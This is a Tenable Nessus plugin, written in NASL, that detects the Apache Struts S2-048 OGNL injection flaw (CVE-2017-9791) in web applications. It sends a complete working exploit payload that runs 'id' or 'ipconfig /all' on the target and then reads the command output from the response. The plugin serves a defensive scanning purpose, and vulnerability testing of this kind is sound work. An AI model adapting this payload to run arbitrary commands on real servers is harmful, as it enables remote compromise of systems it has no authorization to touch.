#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(102918);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2017-9791");
  script_bugtraq_id(99484);
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/08/10");

  script_name(english:"Apache Struts 2.3.x Struts 1 plugin RCE (remote)");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework which is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Struts 1 plugin in Apache Struts 2.3.x is affected by a remote 
code execution vulnerability via a malicious field value passed in a 
raw message to the ActionMessage class.");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-048.html");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-048");
  script_set_attribute(attribute:"solution", value:
"Refer to the s2-048 vendor advisory for mitigation options");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-9791");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache Struts 2 Struts 1 Plugin ActionMessage < 2.3.32 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts 2 Struts 1 Plugin Showcase OGNL Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/07/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/09/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("http.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

vuln = FALSE;
urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    if (cgi =~ "struts2?(-rest)?-showcase")
    {
      urls = make_list(urls, cgi);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

}

# Always check web root
urls = make_list(urls, "/");

# Struts is slow
timeout = get_read_timeout() * 2;
if(timeout < 10)
  timeout = 10;
http_set_read_timeout(timeout);

urls = list_uniq(urls);

unix_cmd = 'id';
win_cmd = 'ipconfig%20%2Fall';
data = "age=20&__checkbox_bustedBefore=true&name=%25%7B%28%23_%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%27"+win_cmd+"%27%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27"+unix_cmd+"%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&description=1";


foreach url (urls)
{
  res = http_send_recv3(
    method       : "POST",
    item         : url,
    port         : port,
    data         : data,
    exit_on_fail : TRUE,
    content_type: "application/x-www-form-urlencoded"
  );

  if ("Windows IP" >< res[2] || "uid" >< res[2])
  {
    if (res[2] =~ "uid=[0-9]+.*gid=[0-9]+.*")
    {
      output = strstr(res[2], "uid");
      if (!empty_or_null(output))
      {
        vuln = TRUE;
        vuln_url = build_url(qs:url, port:port);
        break;
      }
    }
    else if (res[2] =~ "Subnet Mask|Windows IP|IP(v(4|6)?)? Address")
    {
      output = strstr(res[2], "Windows IP");
      if (!empty_or_null(output))
      {
        vuln = TRUE;
        vuln_url = build_url(qs:url, port:port);
        break;
      }
    }
  }
  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(http_last_sent_request()),
  output     : chomp(output)
);
